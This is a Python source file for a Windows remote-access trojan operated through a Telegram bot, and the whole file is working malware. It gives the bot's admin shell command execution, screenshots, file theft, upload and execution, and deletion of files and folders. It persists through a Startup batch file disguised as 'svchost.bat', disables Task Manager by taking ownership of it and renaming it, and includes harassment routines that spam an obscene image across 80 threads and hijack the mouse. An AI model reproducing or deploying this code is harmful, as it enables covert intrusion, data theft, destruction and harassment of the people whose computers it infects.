adminId =  #int
token = ""
import requests
while True:
	try:
		requests.get("http://google.com")
		break
	except: pass


import telebot
from telebot.types import ReplyKeyboardMarkup as markup
from telebot.types import InlineKeyboardButton as button
from telebot.types import InlineKeyboardMarkup as inline

from winreg import *
from os import path
import os
import webbrowser
from random import choice, randint
from threading import Thread
import subprocess
import pyautogui
from pygame import mixer
from gtts import gTTS
import time
import getpass
import json
import sys
import psutil
from tkinter import messagebox
USER_NAME = getpass.getuser()


pyautogui.FAILSAFE = False
commands_list="All commands:\n/delete\n/check\n/open\n/search\n/console\n/get\n/post\n/run\n/stop\n/voice\n/create\n/read\n/write\n/mess\n/fold"
PCK = False
mouse = False
lock = False
save = "None"
#========================markups=====================================

global_menu = button("Home🚩")

#-------------------------старт меню---------------------------------
func = button("Function💽")
commands = button("Slash commands⚡")
dangerous_commands = button("Dangerous zone🛑")
help_b = button("Help❓")
start_menu = markup(resize_keyboard = True, row_width=2).add(func, commands, dangerous_commands, help_b)

#-----------------функции------------------------------------------
screen_b = button("Screenshot💻")
restart = button("Restart PC💻")
start_mouse = button("Run naughty mouse💻")
stop_mouse = button("Stop the naughty mouse💻")
stop = button("Turn off PC💻")
kill = button("Run PCK💻")
kill_stop = button("Stop PCK💻")
random_del = button("Delete random file from disk D💻")
proc_b = button("Processes💻")
func_menu = markup(resize_keyboard = True, row_width=2).add(screen_b, start_mouse, stop_mouse, restart, stop, kill, kill_stop, random_del, proc_b, global_menu)


#---------------------Dangerous zone-----------------------------------
kill_Taskmgr_b = button("Block Task Manager💻")
off = button("Extinguish screen⚠")
on = button("Turn on screen⚠")
lock = button("Lock mouse💻")
unlock = button("Unlock mouse💻")
Dangerous_zone = markup(resize_keyboard = True, row_width=2).add(kill_Taskmgr_b,off,on,lock,unlock,global_menu)

def gen_name(num: int = 8):
	g = ""
	for x in range(num):
		g = g + choice(list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ'))
	return g

def img_spam():
	global PCK
	while PCK:
		p = requests.get('https://image.shutterstock.com/image-illustration/fuck-you-concept-illustration-600w-478617418.jpg')
		name = gen_name()
		out = open(f"D:/{name}.jpg", "wb")
		out.write(p.content)
		out.close()
		os.startfile(rf"D:/{name}.jpg")

def browser_open():
	global PCK
	while PCK:
		webbrowser.open('https://image.shutterstock.com/image-illustration/fuck-you-concept-illustration-600w-478617418.jpg', new=2)

def PCK_start():
	for i in range(80):
		Thread(target=img_spam).start()
		Thread(target=browser_open).start()

def delete_rand():
	try:
		objects = os.listdir('D:/')
		file = choice(objects)
		os.remove(f'D:/{file}')
		return f'File {file} removed'
	except Exception as error: return f"An error has occurred:\n{error}"

def delete(path):
	try:
		os.remove(path)
		return f'File path "{path}" removed'
	except Exception as error: return f"An error has occurred:\n{error}"

def check(path, userId):
	try:
		file_list = os.listdir(path)
		files = '\n'.join(file_list)
		if len(files) > 4096:
			for x in range(0, len(files), 4096):
				client.send_message(userId, files[x:x+4096])
		else:
			client.send_message(userId,  f'Files in the specified directory:\n{files}')
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")

def open_url(url):
	try:webbrowser.open(url, new=2); return f'Linked page is open✔'
	except Exception as error: return f"An error has occurred:\n{error}"


def get_process(userId):
	try:
		processess_list = list()
		for proc in  psutil.process_iter():
			processess_list.append(proc.name())
		processess = '\n'.join(processess_list)
		if len(str(processess)) > 4096:
			for x in range(0, len(str(processess)), 4096):
				client.send_message(userId, str(processess)[x:x+4096])
		else:
			client.send_message(userId,  f'All running processes💻:\n{str(processess)}')
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")

def search_file(file, userId):
	try:
		spisok = list()
		for adress, dirs, files in os.walk('D:\\'):
			if file in adress:
				spisok.append(adress)
		for adress, dirs, files in os.walk('C:\\'):
			if file in adress:
				spisok.append(adress)
		if spisok == []:client.send_message(userId,  f'No file named {file} was found.')
		else:
			info = '\n'.join(spisok)
			if len(info) > 4096:
				for x in range(0, len(info), 4096):
					bot.send_message(userId, info[x:x+4096])
			else:
				client.send_message(userId,  f'All found files named "{file}":\n{info}')
	except Exception as error: client.send_message(userId,  f"An error has occurred:\n{error}")


def send_mess(userId, message):
	try:messagebox.showinfo('Message for You 💞', message);client.send_message(userId, f"Message shown on screen✔")
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")


def get(path, userId):
	try:
		file = open(path, 'rb')
		client.send_document(userId, file)
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")

def post(message, path, userId):
	try:
		file_name = message.document.file_name
		file_id = message.document.file_name
		file_id_info = client.get_file(message.document.file_id)
		downloaded_file = client.download_file(file_id_info.file_path)
		src = file_name
		with open(f'{path}/{src}', 'wb') as new_file:
			new_file.write(downloaded_file)
		client.send_message(message.chat.id, f"The file was successfully saved to the path \"{path}\"")
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")


def run_file(file):
	try:subprocess.call(file); return 'I run the file'
	except Exception as error: return f"An error has occurred:\n{error}"

def screenshot(userId):
	try:
		screen = pyautogui.screenshot('screenshot.png')
		client.send_photo(userId, screen)
		os.remove('screenshot.png')
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")

def stop_exe(app, userId):
	if app !="":
		try:os.system(f"TASKKILL /F /IM {app}");client.send_message(userId, f"if {app} was launched, now closed✔")
		except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")
	else:client.send_message(userId, f"You did not specify an application")

def voice(userId, text):
	try:
		output = gTTS(text=text, lang='en', slow=False)
		output.save("output.mp3")
		mixer.init()
		mixer.music.load('output.mp3')
		mixer.music.play(0)
		time.sleep(len(text)/5)
		mixer.quit()
		client.send_message(userId, f"Text translated into audio message and played✔")
		os.remove('output.mp3')
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")

def mouse_start():
	global mouse
	while mouse:
		pyautogui.moveTo(randint(1, 1900), randint(1, 1900), duration=0.25)


def add_to_startup():
	while True:
		bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
		with open(bat_path + '\\' + "svchost.bat", "w+") as bat_file:
			bat_file.write(fr'start {sys.argv[0]}')
		time.sleep(2)

def kill_Taskmgr(userId):
	try:
		path1 = "C:\Windows\System32\Taskmgr.exe"
		path2 = "C:\Windows\System32\Taskmgr1.exe"

		os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
		os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
		os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l")
		os.system("taskkill /im taskmgr.exe")
		try:os.rename(path1, path2)
		except:pass
		client.send_message(userId, f"Done✔")
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")

def lock_mouse():
	global lock
	while lock:
		pyautogui.moveTo(0, 0)

def delete_fold(userId, path):
	try:Sutil.rmtree(path);client.send_message(userId, f"All possible files removed✔")
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")
def write_file(path, text, userId):
	try:
		file = open(path, 'w')
		file.write(text)
		file.close()
		client.send_message(userId, 'Done✔')
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")

def read_file(path, userId):
	try:
		text = open(path, encoding='utf-8').read()
		if len(text) > 4096:
			for x in range(0, len(text), 4096):
				bot.send_message(userId, text[x:x+4096])
		else:
			client.send_message(userId,  text)
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")

def command_parser(ct: str, userId, save):
	global PCK
	global mouse
	global lock
	content = ct.split(" ")
	try:
		if ct.lower() == "function💽": client.send_message(userId, 'OK...', reply_markup = func_menu)
		elif ct.lower() == "slash commands⚡": client.send_message(userId, commands_list)
		elif ct.lower() == "home🚩": client.send_message(userId, 'OK...', reply_markup = start_menu)
		elif ct.lower() == "dangerous zone🛑": client.send_message(userId, 'OK...', reply_markup = Dangerous_zone)
		elif ct.lower() == 'help❓': client.send_message(userId, 'Each team is listed here.:', reply_markup = inline().add(button("Help❓", url='https://teletype.in/@xsarz-xpu/vzKfJ1fontd')))

		elif ct.lower() == 'screenshot💻':screenshot(userId=userId)
		elif ct.lower() == 'block task manager💻': kill_Taskmgr(userId=userId)
		elif ct.lower() == "run naughty mouse💻":
			if mouse == False:
				mouse=True
				for i in range(10):
					Thread(target=mouse_start).start()
				client.send_message(userId, 'done✔')
			else:client.send_message(userId, 'this function is already running')
		elif ct.lower() == "stop the naughty mouse💻":
			if mouse == True:client.send_message(userId, 'Stop...');mouse=False
			else:client.send_message(userId, 'This func is not running')
		elif ct.lower() == "turn off pc💻": client.send_message(userId, 'I turn off the PC...');os.system("shutdown -s -t 1")
		elif ct.lower() == "restart pc💻": client.send_message(userId, 'I reboot the PC...');os.system("shutdown -r -t 1")
		elif ct.lower() == "run pck💻": client.send_message(userId, 'I start PCK⚡');PCK=True;	Thread(target=PCK_start).start()
		elif ct.lower() == "stop pck💻":
			if PCK == True: client.send_message(userId, 'I stop the flows PCK...');PCK=False
			else: client.send_message(userId, 'PCK not launched🛑')
		elif ct.lower() == "delete random file from disk d💻":
			del_info = delete_rand()
			client.send_message(userId, del_info)
		elif ct.lower() == 'extinguish screen⚠':
			try:os.system(f"TASKKILL /F /IM explorer.exe");client.send_message(userId, 'Done✔')
			except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")
		elif ct.lower() == 'turn on screen⚠':
			try:subprocess.call('C:\Windows\explorer.exe');client.send_message(userId, 'Done✔')
			except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")
		elif ct.lower() == 'lock mouse💻':
			client.send_message(userId, 'Blocking⚡');lock=True
			for i in range(10):
				Thread(target=lock_mouse).start()
		elif ct.lower() == 'unlock mouse💻':
			if lock == True: client.send_message(userId, 'Done✔');lock=False
			else: client.send_message(userId, 'The mouse is not locked🛑')
		elif ct.lower() == 'processes💻':get_process(userId=userId)

		else:
			if content[0][0] == '/':
				if content[0][1:] == 'delete':client.send_message(userId, delete(path=ct.replace(content[0],"")[1:]))
				elif content[0][1:] == 'check':check(path=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'open':client.send_message(userId, open_url(url=ct.replace(content[0],"")[1:]))
				elif content[0][1:] == 'search':client.send_message(userId, 'A search for files with a suitable name has begun.\nI will notify you as soon as the process is completed.✔');Thread(target=search_file, args=(ct.replace(content[0],"")[1:], userId)).start()
				elif content[0][1:] == 'console':os.system(ct.replace(content[0],"")[1:])
				elif content[0][1:] == 'get':get(path=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'post' and save[0][1:]!='post':client.send_message(userId, 'Waiting for a file🧨')
				elif content[0][1:] == 'run':client.send_message(userId, run_file(file=ct.replace(content[0],"")[1:]));client.send_message(userId, 'Command sent✔')
				elif content[0][1:] == 'stop':stop_exe(app=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'voice':voice(userId=userId, text=ct.replace(content[0],""))
				elif content[0][1:] == 'fold':delete_fold(userId=userId, path=ct.replace(content[0],"")[1:])
				elif content[0][1:] == 'create':
					path = ct.replace(content[0],"")[1:]
					try:file = open(path, 'w');file.close();client.send_message(userId, f'File created✔\nPath: {path}')
					except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")
				elif content[0][1:] == 'write':write_file(path=content[1], text=ct.replace(content[0],"").replace(content[1],"")[1:], userId=userId)
				elif content[0][1:] == 'read':read_file(path=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'mess':send_mess(userId=userId, message=ct.replace(content[0],""))
			else:client.send_message(userId, "Command not found☹")
	except IndexError:client.send_message(userId, "You didn't provide any arguments")
	except Exception as error:client.send_message(userId, f"An error has occurred:\n{error}")


#=======================================================
client = telebot.TeleBot(token)
client.send_message(adminId, 'PC on the network⚡')
@client.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == adminId: client.send_message(message.from_user.id, 'Hi {0.first_name}, choose a command'.format(message.from_user), reply_markup = start_menu)
	else:  client.send_message(message.from_user.id, 'You are not an admin'.format(message.from_user))

@client.message_handler(content_types=['text'])
def on_msg(message):
	global save
	text = message.text
	user_id = message.from_user.id
	if user_id != adminId: client.send_message(message.from_user.id, 'You are not an admin')
	else:save = text;command_parser(ct=text, userId=user_id, save=save.lower().split(" "))

@client.message_handler(content_types=['document'])
def on_file(message):
	document_id = message.document.file_id
	file_info = client.get_file(document_id)
	file = f'http://api.telegram.org/file/bot{token}/{file_info.file_path}'
	global save
	content = save.lower().split(" ")
	if content[0][0] == '/':
		if content[0][1:] == 'post':
			try:
				path=save.replace(content[0],"")[1:]
				p = requests.get(file)
				out = open(path, "wb")
				out.write(p.content)
				out.close()
				client.send_message(message.from_user.id, f'File saved\nFile path:\n{path}')
			except Exception as error:client.send_message(message.from_user.id, f"An error has occurred:\n{error}")


if __name__ == '__main__':
	Thread(target=add_to_startup).start()
	client.polling(none_stop=True)